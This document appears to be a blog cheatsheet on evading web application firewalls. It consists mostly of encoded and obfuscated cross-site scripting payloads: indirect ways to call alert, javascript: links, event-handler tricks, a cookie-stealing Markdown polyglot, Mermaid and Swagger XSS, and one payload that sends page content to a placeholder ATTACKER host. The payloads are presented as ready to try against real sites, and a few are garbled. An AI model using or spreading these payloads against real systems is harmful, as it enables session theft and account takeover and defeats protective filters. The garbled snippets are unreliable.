
# Cheatsheet: Bypassing WAFs through Payload Encoding

If you're looking for ready-made payloads, go to the end of this blogpost, where I include some interesting ones.


## 1. Using Unicode in JSON Objects to Bypass String Checks

To bypass common string checks, you can use Unicode encoding on JSON objects. This can help hide the payload in ways not recognized by WAF.

**Example:**
```javascript
JavaScript:\u000aalert('Test')
```

## 2. HTML Encoding in XSS Payloads

Using HTML encoding is an effective technique for cloaking XSS payloads. This allows the script to be interpreted by the browser, but not by the WAF.

**Example:**
```html
<s&#x61;lert('XSS');</script>
```


## URL Encoding to bypass WAF

URL encoding is an effective technique for evading WAFs, especially in situations where payloads are sent as part of URLs.

**Example:**
```http
GET /path/%61lert(%22XSS%22)
```

## Double URL Encoding to Confuse WAFs

Double encoding can be used to confuse WAFs that do not decode payloads multiple times.

**Example:**
```html
%253Cscript%253Ealert(%2527XSS%2527)%253C/script%253E
```

## Different ways to run the alert
1. **Using Constructors and Prototype:**
    ```javascript
    new Function('al' + 'ert')(1)
    ```

2. **Regular Expression and String Match:**
    ```javascript
    /al/.source+/ert/.source/['split'](/a/).join('')(1)
    ```

3. **Creating Functions from Strings:**
    ```javascript
    eval(String.fromCharCode(97,108,101,114,116)+'(1)')
    ```

4. **Unicode Character Decoding:**
    ```javascript
    eval("\\u0061\\u006c\\u0065\\u0072\\u0074(1)")
    ```

5. **Running through Hypertext Links:**
    ```javascript
    location.href="javascript:alert(1)"
    ```

6. **Using SetTimeout for Indirect Execution:**
    ```javascript
    setTimeout('al'+'ert(1)',0)
    ```

7. **Indirect Access via Window Object:**
    ```javascript
    window['al' + 'ert'](1)
    ```

8. **Base64 Encoding and Decoding:**
    ```javascript
    eval(atob('YWxlcnQoMSk='))
    ```

9. **String Manipulation and Function Constructor:**
    ```javascript
    ('a' + 'l' + 'e' + 'r' + 't')(1)
    ```

10. **Execution via URL Object:**
     ```javascript
     URL.createObjectURL(new Blob(['alert(1)'], {type: 'text/javascript'}))
     ```

11. **Using the Blob Builder:**
     ```javascript
     new Blob(['al'+'ert(1)'], {type: 'text/javascript'})
     ```

12. **Use of String Methods for Command Construction:**
     ```javascript
     'alert'.concat('(1)')
     ```

13. **Dynamic Object Property Assignment:**
     ```javascript
     ({['a'+'l'+'e'+'r'+'t']:alert})['alert'](1)
     ```

14. **Array and Join Manipulation:**
     ```javascript
     [,'al','ert'].join('')(1)
     ```

15. **String Concatenation via Template Literals:**
     ```javascript
     `${'al'}${'ert'}(1)`
     ```

### Use different Encoding formats together (Uppercase, Lowercase, Unicode, Spaces, Comments, Newlines, Tabs...)
1. **Uppercase:**
    ```html
    <A HREF=JAVASCRIPT:ALERT()>click me</A>
    ```

2. **Lowercase:**
    ```html
    <a href=javascript:alert()>click me</a>
    ```

3. **Unicode Encoding:**
    ```html
    <a href=>
    ```

4. **Space to Comment:**
    ```html
    <a href=javascript:var/**/httpx/**/=/**/new/**/XMLHttpRequest()...>click me</a>
    ```

5. **HTML Encoding:**
    ```html
    <a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&# 97;&#108;&#101;&#114;&#116;&#40;&#41;>click me</a>
    ```

6. **Hex Encoding:**
    ```html
    <a href=%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%29>click me</a>
    ```

Another examples:

1. **Using the `onclick` Event:**
    ```html
    <a href="#" onclick="alert();return false;">click me</a>
    ```

2. **`data-*` attribute and JavaScript:**
    ```html
    <a href="#" onclick="eval(this.dataset.code);" data-code="alert()">click me</a>
    ```

3. **Using Base64 and `atob()`:**
    ```html
    <a href="#" onclick="eval(atob('YWxlcnQoKQ=='))">click me</a>
    ```

4. **Incorporating JavaScript into `href`:**
    ```html
    <a href="javascript:void(alert())">click me</a>
    ```

5. **Using `Object.defineProperty`:**
    ```html
    <a href="#" id="uniqueLink">click me</a>
    <script>Object.defineProperty(window, 'cl', {get: function() { alert(); }});document.getElementById('uniqueLink').href = 'javascript:cl';</script>
    ```

6. **Using Encoded JavaScript:**
    ```html
    <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;& #97;&#108;&#101;&#114;&#116;&#40;&#41;">click me</a>
    ```
7. **Running through `top`:**
    ```html
    <a href="javascript:top['alert'](window.name)" name="1">click me</a>
    ```

8. **`onmouseover` attribute for Click Action:**
     ```html
     <a href="#" onmouseover="alert();">click me</a>
     ```

9. **Injection through `innerHTML`:**
     ```html
     <ahref="#" id="dynamicLink">click me</a>
     <script>document.getElementById('dynamicLink').innerHTML = '<a href="javascript:alert()">click me</a>';</script>
     ```

10. **`onfocus` event with `tabindex`:**
     ```html
     <a href="#" onfocus="alert()" tabindex="1">click me</a>
     ```

## Some XSS payloads to try

If you can get an XSS with any payload from here, please let me know, I'll be happy to know!

```html
<object/data=javascript:alert()>
<a/href="javascript%0A%0D:alert()">
<svg onpointerenter=z=alert,z(document.domain)>
<button formation=javascript:z=top;x=document;y=x.domain; z[/al/.source+/ert/.source](y)>XSS</button>
>>

'\"><a href=\"&#74;avascript&#x3a;self['\\x61\\x6c\\x65\\x72\\x74']('\\x58\\x53\\x53' )\">test</a

{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\u0022a\u0022,\u0022alert(1)\u0022].sort(toString.constructor);}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}

<script>/&/-alert(1)</script>
<script>/&/-alert(1)</script>

%00%00%00%00%00%00%00<script>alert(1)</script>

<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click

<script>alert.call(null,1)</script> (alert.call(%20, "XSS");)

<script>confirm.call(null,1)</script>

<script>prompt.call(null,1)</script>

<script>alert.apply(null, [1])</script>


<img src=x onerror=alert(new Image().src='http://ATTACKER/any?output='+document.body.innerHTML>

<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">

'"><>--!><--example'"><>--!><-->>>>>!--><img src=v onerror=alert(2)>{{7 *7}}{{constructor.constructor('alert(document.cookie)')()}}javascript:alert(12)

<!-- Bitwise operand before equal sign - URL encoded -->

<svg%20onload%0a||||=%27z=top%09;%0atop[/pro/.source+/mpt/.source]%28document.domain%29%20%27<li

<!-- unicode normalization payload -->

\u0022\u226F\u226Eimg src\u003dx onerror\u003dalert()\u226F

<!-- triple url encode -->

%252522+onmouseover=alert(1)+x=%252522s

<!-- XSS inside tynemce -->

<TABLE><TD><DIV><iframe/<META HTTP-EQUIV='refresh' CONTENT='0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgncmFmYWVsJyk8L3NjcmlwdD4K'>

```

### Markdown XSS Polyglot

```
[markdownxss click here](j a v a s c r i p t:prompt(document.cookie))[markdownxss click here](Javascript:self['\x61\x6c\x65\x72\x74']('\x58\x53\x53'))[ markdownxss click here](markdownxss click here)[markdownxss click here](j a v a s c r i p t:prompt(document.cookie))[markdownxss click here](javascript:prompt(document.cookie))[markdownxss click here](j a v a s c r i p t:prompt(document .cookie))![markdownxss click here](javascript:prompt(document.cookie))\&gt;[text](http://markdownxss.com \" [@markdownxss](/markdownxss) \")[markdownxss click here](javascript:this;alert(1))[markdownxss click here](javascript:this;alert(1))[markdownxss click here](javascript:this;alert(1))[markdownxss click here](Javascript: alert(1))[markdownxss click here](Javas%26%2399;ript:alert(1))[markdownxss click here](javascript:alert(1))[markdownxss click here](javascript:confirm(1)[ markdownxss click here](javascript://www.google.com%0Aprompt(1))[markdownxss click here](javascript://%0d%0aconfirm(1);com)[markdownxss click here](javascript:window. onerror=confirm;throw%201)[markdownxss click here](javascript:alert(document.domain))[markdownxss click here](javascript://www.google.com%0Aalert(1))[markdownxss click here]( 'javascript:alert(\"1\")')[markdownxss click here](JaVaScRiPt:alert(1))![markdownxss click here](https://www.google.com/image.png\"onload= \"alert(1))![markdownxss click here](\"onerror=\"alert(1))
```

### Mermaid XSS
```markdown
\`\`\`mermaid
graph LR
     id1["<img src=x onerror=alert#lpar;document.domain#rpar;>"]
\`\`\`
```

### Swagger XSS (Credits to Dawid Moczadło - [https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/))

```yaml
swagger: '2.0'
info:
  title: Example yaml.spec
  description: |
    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
paths:
  /accounts:
    get:
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      operationId: findAccounts
      summary: Finds all accounts
```
